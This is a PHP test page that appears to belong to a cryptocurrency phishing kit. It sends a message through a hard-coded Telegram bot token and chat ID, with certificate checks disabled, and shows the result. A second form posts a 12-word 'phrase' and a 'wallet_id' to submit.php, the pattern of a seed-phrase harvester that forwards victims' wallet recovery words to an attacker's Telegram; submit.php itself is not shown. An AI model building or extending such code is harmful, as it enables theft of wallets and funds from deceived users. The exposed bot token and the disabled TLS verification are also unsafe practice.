<?php
// QUICK TEST - Visit this file directly in browser
// This will send a test message to your Telegram

$botToken = '8207229530:AAF2CAILD5IU8etTbdPfp5MWQbrd2bgYux0';
$chatId = '7811008623';

$message = "🧪 QUICK TEST\n\nTime: " . date('Y-m-d H:i:s') . "\n\nIf you see this, Telegram is working!";

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = http_build_query([
    'chat_id' => $chatId,
    'text' => $message
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

?>
<!DOCTYPE html>
<html>
<head>
    <title>Quick Test</title>
    <style>
        body { font-family: Arial; padding: 40px; background: #f5f5f5; }
        .box { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; }
        .success { color: #155724; background: #d4edda; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .error { color: #721c24; background: #f8d7da; padding: 15px; border-radius: 5px; margin: 20px 0; }
        pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Quick Telegram Test</h1>
        
        <p><strong>HTTP Code:</strong> <?php echo $httpCode; ?></p>
        
        <?php
        if ($error) {
            echo '<div class="error"><strong>cURL Error:</strong> ' . htmlspecialchars($error) . '</div>';
        }
        
        $result = json_decode($response, true);
        
        if ($httpCode == 200 && isset($result['ok']) && $result['ok']) {
            echo '<div class="success">';
            echo '<h2>✅ SUCCESS!</h2>';
            echo '<p>Message sent to Telegram! Check your Telegram now.</p>';
            echo '<p>Message ID: ' . ($result['result']['message_id'] ?? 'N/A') . '</p>';
            echo '</div>';
        } else {
            echo '<div class="error">';
            echo '<h2>❌ FAILED</h2>';
            if (isset($result['description'])) {
                echo '<p><strong>Error:</strong> ' . htmlspecialchars($result['description']) . '</p>';
            } else {
                echo '<p>Unknown error</p>';
            }
            echo '</div>';
        }
        ?>
        
        <h3>Full Response:</h3>
        <pre><?php echo htmlspecialchars($response); ?></pre>
        
        <hr>
        <h3>Test Form Submission:</h3>
        <form method="POST" action="submit.php" style="margin-top: 20px;">
            <textarea name="phrase" rows="3" style="width: 100%; padding: 10px;" required>test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12</textarea>
            <input type="hidden" name="wallet_id" value="Quick Test">
            <button type="submit" style="margin-top: 10px; padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Test submit.php</button>
        </form>
    </div>
</body>
</html>

